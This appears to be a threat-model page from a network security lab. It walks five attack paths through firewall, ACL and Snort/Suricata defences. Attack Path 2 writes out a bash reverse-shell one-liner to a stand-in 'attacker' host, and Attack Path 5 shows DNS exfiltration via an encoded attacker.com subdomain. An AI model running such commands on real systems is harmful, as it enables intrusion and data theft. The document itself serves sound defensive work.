# Attack Paths & Mitigations

## Attack Path 1: External Attacker → Internal Pivot

```
Internet
  → Port scan DMZ (detected by Snort SID:1000001)
  → Exploit unpatched web service on DMZ (10.10.0.10:443)
  → Attempt pivot: DMZ → LAN
  ✗ BLOCKED: nftables rule drops DMZ→LAN (10.10.0.0 → 10.20.0.0)
```
**Result**: Pivot prevented by network segmentation. Attacker contained in DMZ.

---

## Attack Path 2: Phishing → Reverse Shell → C2

```
User on LAN opens phishing email
  → Executes payload: bash -i >& /dev/tcp/attacker/4444 0>&1
  → Snort detects: SID:1000030 "BACKDOOR Bash Reverse Shell Outbound"
  → Suricata flags regular C2 beacon intervals (SID:2000001)
  → SOC alerted → host quarantine
```
**Result**: C2 channel detected and interrupted within minutes.

---

## Attack Path 3: SSH Brute Force on Management

```
Attacker discovers SSH on MGMT VLAN
  → Launches brute force (hydra / medusa)
  → iptables: 4 failed attempts → source IP rate-limited (DROP)
  → Snort: SID:1000010 "BRUTE SSH login attempt" — alert raised
  → After lockout: firewall log shows source IP with 100+ drops
```
**Result**: Brute force neutralised. IP logged and blocked.

---

## Attack Path 4: Insider Threat — Guest → Internal

```
Visitor connects to GUEST Wi-Fi (VLAN 30)
  → Attempts to reach internal file server (10.20.0.50)
  → ACL: deny ip 10.30.0.0/24 10.0.0.0/8
  → nftables: GUEST forward chain drops all non-Internet traffic
```
**Result**: No internal access possible from GUEST zone.

---

## Attack Path 5: DNS Exfiltration

```
Malware on LAN host exfiltrates data via DNS TXT records
  → Encodes data in long subdomain: aGVsbG8gd29ybGQ.attacker.com
  → Snort: SID:1000040 "DNS Tunnelling — Long Subdomain" triggered
  → Suricata: SID:2000005 "DNS Large TXT Response" triggered
  → Alert raised, host investigated
```
**Result**: Exfiltration channel detected before significant data loss.
